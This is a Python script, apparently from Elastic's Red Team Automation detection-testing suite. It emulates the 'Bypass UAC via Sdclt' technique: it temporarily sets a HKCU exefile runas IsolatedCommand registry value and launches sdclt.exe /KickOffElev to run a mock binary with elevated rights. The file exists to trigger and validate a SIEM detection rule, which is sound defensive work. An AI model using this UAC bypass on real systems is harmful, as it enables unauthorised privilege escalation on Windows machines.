# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Bypass UAC via Sdclt
# RTA: uac_sdclt.py
# ATT&CK: T1088
# Description: Modifies the Registry to auto-elevate and execute mock malware.

import os
import sys
import time

from . import common

PLATFORMS = [common.WINDOWS]
TRIGGERED_RULES = {
    "SIEM": [{"rule_id": "9b54e002-034a-47ac-9307-ad12c03fa900", "rule_name": "Bypass UAC via Sdclt"}],
    "ENDPOINT": []
}
TACTICS = []
RTA_ID = "fd3577f0-a4d6-4a08-b31d-2e53ffff92b2"

# HKCU:\Software\Classes\exefile\shell\runas\command value: IsolatedCommand
# "sdclt.exe /KickOffElev" or children of sdclt.exe
# HKLM value: "%1" %*


@common.requires_os(PLATFORMS)
def main(target_process=common.get_path("bin", "myapp.exe")):
    target_process = os.path.abspath(target_process)

    common.log("Bypass UAC via Sdclt to run %s" % target_process)

    key = "Software\\Classes\\exefile\\shell\\runas\\command"
    value = "IsolatedCommand"

    with common.temporary_reg(common.HKCU, key, value, target_process):
        common.log("Running Sdclt to bypass UAC")
        common.execute([r"c:\windows\system32\sdclt.exe", "/KickOffElev"])

        time.sleep(2)
        common.log("Killing the Windows Backup program sdclt", log_type="!")
        common.execute(['taskkill', '/f', '/im', 'sdclt.exe'])


if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
